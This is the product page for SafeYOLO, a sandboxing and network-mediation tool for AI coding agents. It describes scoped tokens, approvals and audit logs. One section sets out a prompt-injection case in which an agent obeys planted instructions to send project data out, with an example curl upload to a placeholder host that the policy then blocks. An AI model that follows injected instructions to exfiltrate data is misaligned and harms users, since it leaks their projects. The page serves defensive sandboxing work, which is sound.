SafeYOLO

Stop approving. Start delegating.

Let agents work. Control where they can reach.

Set the boundary once. Your agents work unattended and only ask when something is genuinely outside it. Get your day back.

SafeYOLO runs Claude Code, OpenAI Codex, Pi and other agents in isolated Linux sandboxes with controlled network and service access. Give agents guest-local root to install tools, run browsers, start services and debug code - without giving them unrestricted access to your host or the Internet.

Not only for code: agents can also run services and manage remote systems through API calls that SafeYOLO mediates.

What's different

Techniques you won't find in a plain sandbox.

One key, many narrow scopes

Keep a single powerful API key on your host. Each agent gets its own token that works only for the methods and paths of its capability, so a reader cannot create new keys, change settings or leak the real one.

SafeYOLO ships ready-to-use definitions for GitHub, Git, Slack, Gmail, Claude and Codex. For your own APIs, your agent prepares a definition with the bundled SafeYOLO skill, or you generate one from an OpenAPI specification; you adopt it.

Agents are challenged before you are

When an agent asks for access its capability lacks, SafeYOLO first puts your questions to it, such as where the instruction came from, and can run an independent check, including a second model. You see the request with those answers and findings attached.

Checks and challenges

Approvals that show consequences

Service definitions can carry an effect model prepared before any request. An approval then shows what the grant adds up to, not just the endpoint.

For example: an agent that can already run a job asks to edit that job's steps. The approval shows that the two together let it run changed code, and that the change persists after access expires.

Docker without the daemon keys

Run Docker inside the agent's own sandbox, share another agent's Docker as a service, or delegate a Docker host you already run. On that host, choose all workloads or one project's containers, networks and volumes. Each management request through SafeYOLO is checked against the agent's capability.

The problem

Agents need freedom to work. That shouldn't mean unlimited authority.

Coding agents install packages, launch browsers, run development servers, call APIs and increasingly work unattended for long periods.

Approve every operation and you lose the autonomy.

Give the agent your machine and unrestricted network access and every mistake, injected instruction or runaway loop gets the same authority you do.

The useful boundary is different:

  • Root inside the agent's sandbox, not on your host
  • External destinations and service capabilities that you choose
  • Service credentials kept outside the agent where possible
  • Limits on runaway network activity
  • A record of what the agent attempted and why it was allowed or blocked

SafeYOLO separates local freedom from external authority.

What SafeYOLO does

Isolated workspace

Each agent gets its own Linux sandbox and persistent home: hardware-backed microVMs on Apple Silicon macOS, rootless gVisor on Linux.

Controlled network access

The sandbox has no external network interface, so every request leaves through SafeYOLO.

The default policy allows any destination within rate budgets. Set your boundary once, with host patterns, maintained host lists and service capabilities, and agents ask only about what falls outside it.

Protected service credentials

The service gateway can keep credentials on the trusted host and inject them only into authorised requests.

The credential guard checks selected request headers for credentials. By default, an unknown credential needs approval.

Visible work

Inspect HTTP(S) traffic and open sandboxed browser or desktop previews while the agent works.

Limits and evidence

Rate budgets and circuit breakers constrain runaway activity.

Structured audit records preserve requests, decisions and block reasons.

A real failure mode

An agent encounters instructions in an issue, dependency or web page telling it to send project data to an external service.

It complies.

What happens next depends on your policy. Here, unlisted destinations need approval:

policy.toml: "*" = { egress = "prompt" }
agent$ curl https://unknown.example/upload ...
HTTP 428 — Network access requires approval
Access to unknown.example is not in the allowed hosts list.

The agent cannot route around that decision: its sandbox has no direct external network interface. The attempt, the decision and its reason are recorded, and you approve or deny it.

The default policy allows any destination, so there the same upload succeeds and is recorded. SafeYOLO does not judge whether data is sensitive or an instruction is malicious, and it does not detect or prevent prompt injection. It limits what an agent can reach to what your policy allows.

If the request uses a service configured through SafeYOLO's gateway, the real service credential can remain on the host and is injected only after the request is authorised.

Install

SafeYOLO is pre-v1. Installation uses prebuilt release artifacts; no guest build is needed.

On Ubuntu 24.04 (x86_64), follow the complete Quick start from your own project directory with an ordinary sudo-enabled account. Read its workspace, login and installation context before running the two commands.

Quick start

For Apple Silicon macOS 26 or later and Linux arm64, download the matching production archive from the latest release. Follow the archive installation guide to install it.

For Windows, the Windows Subsystem for Linux 2 (WSL2) guide starts with an operator-prepared distribution and qualified Linux host and guest inputs. It does not provision Windows or WSL2, or acquire those inputs.
